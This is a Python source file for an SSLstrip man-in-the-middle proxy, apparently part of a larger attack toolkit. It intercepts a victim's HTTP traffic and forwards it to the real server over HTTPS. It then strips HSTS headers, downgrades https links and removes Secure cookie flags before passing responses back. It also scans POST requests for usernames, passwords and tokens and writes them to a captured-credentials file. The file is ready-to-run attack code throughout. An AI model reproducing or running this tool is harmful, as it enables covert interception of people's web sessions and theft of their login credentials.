import socket
import ssl
import threading
import re
from misc.logging import handle_log
from misc.grab_config import get_config


LISTEN_PORT = 8080
CREDS_FILE = "./resources/captured.txt"


def save_capture(data: str):
    with open(CREDS_FILE, "a") as f:
        f.write(data + "\n")


def extract_interesting(raw: str):
    """
    extract anything that looks like credentials or sensitive fields
    """
    interesting = []

    patterns = {
        "username": r"(?i)(user|username|email|login)[=:]([^\s&]+)",
        "password": r"(?i)(pass|password|passwd|pwd)[=:]([^\s&]+)",
        "token":    r"(?i)(token|auth|api_key|apikey)[=:]([^\s&]+)",
    }

    for label, pattern in patterns.items():
        matches = re.findall(pattern, raw)
        for match in matches:
            found = f"{match[0]}={match[1]}"
            interesting.append(found)
            print(f"    [!!] Found {label}: {found}")
            handle_log(f"CAPTURED {label}: {found}")

    return interesting


def rewrite_response(response: bytes) -> bytes:
    """
    The actual SSLstrip logic:
    - Replace https:// with http:// in body
    - Strip HSTS headers
    - Strip Secure flag from cookies
    """
    try:
        text = response.decode("utf-8", errors="ignore")

        # strip HSTS header
        text = re.sub(r"Strict-Transport-Security:.*?\r\n", "", text, flags=re.IGNORECASE)

        # downgrade https links to http
        text = re.sub(r"https://", "http://", text)

        # strip Secure flag from Set-Cookie
        text = re.sub(r";\s*Secure", "", text, flags=re.IGNORECASE)

        return text.encode("utf-8", errors="ignore")

    except Exception as e:
        print(f"[x] Rewrite error: {e}")
        return response


def handle_client(client_sock: socket.socket, client_addr: tuple):
    """
    Handles one victim connection:
    1. Read their HTTP request
    2. Forward it to the real server over HTTPS
    3. Rewrite the response and send back over plain HTTP
    """
    try:
        request = b""

        client_sock.settimeout(5)

        while True:
            chunk = client_sock.recv(4096)
            if not chunk:
                break
            request += chunk
            if b"\r\n\r\n" in request:
                break

        if not request:
            return

        decoded = request.decode("utf-8", errors="ignore")
        print(f"\n[+] Request from {client_addr[0]}")

        # log the raw request
        handle_log(f"REQUEST from {client_addr[0]}: {decoded[:120]}")
        save_capture(f"--- REQUEST from {client_addr[0]} ---\n{decoded[:500]}")

        # look for creds in POST body
        if "POST" in decoded:
            print(f"    [*] POST request detected — scanning for credentials")
            extract_interesting(decoded)

        # pull host from request headers
        host_match = re.search(r"Host:\s*([^\r\n]+)", decoded, re.IGNORECASE)
        if not host_match:
            print(f"[x] No host header found, dropping")
            return

        host = host_match.group(1).strip()
        print(f"    [*] Forwarding to real server: {host}")

        # forward to real server over HTTPS
        try:
            context = ssl.create_default_context()
            real_sock = socket.create_connection((host, 443), timeout=10)
            real_sock = context.wrap_socket(real_sock, server_hostname=host)

            # rewrite their request to be HTTPS compatible
            upgraded = decoded.replace("http://", "https://", 1)
            real_sock.sendall(upgraded.encode("utf-8", errors="ignore"))

            # read response from real server
            response = b""
            real_sock.settimeout(10)
            while True:
                try:
                    chunk = real_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            real_sock.close()

        except Exception as e:
            print(f"[x] Error connecting to real server {host}: {e}")
            handle_log(f"FORWARD ERROR to {host}: {e}")
            return

        # rewrite response (strip HSTS, downgrade https links)
        rewritten = rewrite_response(response)

        # send stripped response back to victim
        client_sock.sendall(rewritten)
        handle_log(f"RESPONSE sent back to {client_addr[0]} (stripped HSTS, downgraded links)")
        print(f"    [+] Response forwarded and rewritten")

    except Exception as e:
        print(f"[x] handle_client error: {e}")
    finally:
        client_sock.close()


def start_sslstrip(port=LISTEN_PORT):
    """
    Main SSLstrip proxy — listens for redirected HTTP/HTTPS traffic
    """
    print(f"[*] Starting SSLstrip proxy on port {port}")
    print(f"[*] Captures saved to {CREDS_FILE}")
    print("[*] Press Ctrl+C to stop\n")

    handle_log(f"SSLstrip proxy started on port {port}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(50)

    try:
        while True:
            client_sock, client_addr = server.accept()
            print(f"[+] Connection from {client_addr[0]}:{client_addr[1]}")

            thread = threading.Thread(
                target=handle_client,
                args=(client_sock, client_addr),
                daemon=True
            )
            thread.start()

    except KeyboardInterrupt:
        print("\n[*] SSLstrip stopped")
        handle_log("SSLstrip proxy stopped")
    finally:
        server.close()